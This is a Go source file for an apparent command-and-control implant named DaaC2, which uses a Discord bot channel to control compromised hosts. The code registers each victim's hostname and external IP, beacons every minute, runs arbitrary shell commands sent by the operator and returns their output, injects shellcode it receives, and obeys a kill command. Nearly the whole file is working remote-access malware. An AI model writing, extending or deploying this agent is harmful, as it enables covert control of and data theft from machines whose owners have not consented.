package main

import (
	"DaaC2/pkg/c2agent"
	"DaaC2/pkg/c2discord"
	"DaaC2/pkg/c2message"
	"DaaC2/pkg/util"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

// Agent gives us the 'agent' object for this instance
var Agent *c2agent.AgentInfo

func init() {
	quitEarly := false

	if c2discord.Token == "" {
		fmt.Println("Add your auth token in c2discord.go")
		quitEarly = true
	}

	if c2discord.ChannelID == "" {
		fmt.Println("Add your channel id in c2discord.go")
		quitEarly = true
	}

	if quitEarly {
		os.Exit(0)
	}

	Agent = &c2agent.AgentInfo{}
	Agent.AgentID = util.RandomString(8)
	Agent.HostName, _ = os.Hostname()
	Agent.RemoteIP = getExternalIP()
	Agent.TimeInitialised = time.Now().String()

	// set OS here easily
	opsys := "?"
	if runtime.GOOS == "windows" {
		opsys = "Windows"
	} else if runtime.GOOS == "linux" {
		opsys = "Linux"
	} else if runtime.GOOS == "darwin" {
		opsys = "Darwin (Mac?)"
	} else {
		opsys = "Unknown"
	}
	Agent.OperatingSystem = opsys
}

func main() {
	dg, err := discordgo.New("Bot " + c2discord.Token)
	if err != nil {
		fmt.Println("error creating Discord session,", err)
		return
	}

	// build our message to send back to the server
	totalString := Agent.HostName + "§" + Agent.RemoteIP + "§" + Agent.TimeInitialised
	newMessage := c2message.CreateNewMessage(c2message.MESSAGE_AGENT_JOIN, Agent.AgentID, "", totalString)
	connectionMessage := c2message.EncodeMessageObject(newMessage)
	dg.ChannelMessageSend(c2discord.ChannelID, connectionMessage)

	// Register the messageCreate func as a callback for MessageCreate events.
	dg.AddHandler(messageCreate)

	// Open a websocket connection to Discord and begin listening.
	err = dg.Open()
	if err != nil {
		fmt.Println("error opening connection,", err)
		return
	}

	// ping the server every minute for now
	pulseDelay := time.Duration(60)
	tick := time.NewTicker(time.Second * pulseDelay)
	go heartbeat(dg, tick)

	// Wait here until CTRL-C or other term signal is received.
	fmt.Println("Bot is now running.  Press CTRL-C to exit.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc

	// build our message to send back to the server
	newMessage = c2message.CreateNewMessage(c2message.MESSAGE_AGENT_LEFT, Agent.AgentID, "", "[-] Agent disconnected")
	disconnectionMessage := c2message.EncodeMessageObject(newMessage)
	dg.ChannelMessageSend(c2discord.ChannelID, disconnectionMessage)

	// Cleanly close down the Discord session.
	dg.Close()
}

// This function will be called (due to AddHandler above) every time a new
// message is created on any channel that the autenticated bot has access to.
func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignore all messages created by the bot itself
	// This isn't required in this specific example but it's a good practice.
	//if m.Author.ID == s.State.User.ID {
	//	return
	//}

	sendMessage, responseMessage := parseMessage(m.Content)

	// do we actually have anything to send, or did we ignore it?
	if sendMessage {
		s.ChannelMessageSend(m.ChannelID, responseMessage)
	}
}

func parseMessage(message string) (bool, string) {
	// build our message to send back to the server
	newMessage := &c2message.Message{}
	responseText := ""

	// decode our b64 message first, derp
	decodedData, _ := base64.StdEncoding.DecodeString(message)

	// now we need to handle the JSON unmarshalling
	var jsonData c2message.Message
	json.Unmarshal(decodedData, &jsonData)

	sendMessage := true

	if jsonData.FromServer == false {
		sendMessage = false
	}

	// quick check to see if we need to ignore the message
	if jsonData.ToID != "" && jsonData.ToID != Agent.AgentID {
		sendMessage = false
	}

	if sendMessage == true {
		// check the first part of the message
		if jsonData.MessageType == c2message.MESSAGE_COMMAND {
			responseText = handleCommand(jsonData.Data)
			newMessage = c2message.CreateNewMessage(c2message.MESSAGE_RESPONSE, Agent.AgentID, "", responseText)
		} else if jsonData.MessageType == c2message.MESSAGE_SHELLCODE {
			sendMessage = false // flip this back as we don't need to send anything back after our kill sig
			handleShellcode(jsonData.Data)
		} else if jsonData.MessageType == c2message.MESSAGE_KILL {
			sendMessage = false // flip this back as we don't need to send anything back after our kill sig
			c2agent.Kill()
		} else {
			// not sure if we need this one, but it's here incase... just a standard repsonse?
			newMessage = c2message.CreateNewMessage(c2message.MESSAGE_RESPONSE, Agent.AgentID, "", responseText)
		}

		base64str := c2message.EncodeMessageObject(newMessage)
		return sendMessage, base64str
	}

	return sendMessage, responseText
}

func handleCommand(cmd string) string {
	// check if we have any args?
	fmt.Println(cmd)
	messageChunks := strings.Split(cmd, " ")
	cmd = messageChunks[0]
	args := ""

	// if we have more than 1 chunk, we likely have some args for the command
	if len(messageChunks) > 1 {
		for i := 1; i < len(messageChunks); i++ {
			args += messageChunks[i] + " "
		}

		args = args[:len(args)-1] // get rid of the last whitespace char at the end otherwise we break our args in exec
	}

	responseMessage := ""

	if args == "" {
		out, err := exec.Command(cmd).Output()

		if err != nil {
			responseMessage = "Failed to exec cmd: " + cmd + " -> " + err.Error()
		} else {
			responseMessage = string(out)
		}
	} else {
		fmt.Println("ARGS: ", args)
		out, err := exec.Command(cmd, args).Output()

		if err != nil {
			responseMessage = "Failed to exec cmd: " + cmd + " -> " + err.Error()
		} else {
			responseMessage = string(out)
		}
	}

	return responseMessage
}

// unix only for now?
func handleShellcode(hexcode string) {
	sc, err := hex.DecodeString(hexcode)

	if err != nil {
		fmt.Println("Problem decoding hex")
	} else {
		c2agent.InjectShellcode(sc)
	}
}

func heartbeat(dg *discordgo.Session, tick *time.Ticker) {
	for t := range tick.C {
		pingTheServer(dg, t)
	}
}

// Attempt to ping the server to let them know we are still alive and kicking. This will (in theory) remain persistent even if the server resets etc
func pingTheServer(dg *discordgo.Session, t time.Time) {
	// build our message to send to the server
	newMessage := c2message.CreateNewMessage(c2message.MESSAGE_PING, Agent.AgentID, "", "Ping at: "+t.String())
	pingMessage := c2message.EncodeMessageObject(newMessage)
	dg.ChannelMessageSend(c2discord.ChannelID, pingMessage)
}

// meh, it works
func getExternalIP() string {
	externalIP := ""
	resp, err := http.Get("http://myexternalip.com/raw")
	if err != nil {
		externalIP = "error"
	} else {
		defer resp.Body.Close()
		bodyBytes, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			externalIP = "error"
		} else {
			externalIP = string(bodyBytes)
		}
	}
	return externalIP
}
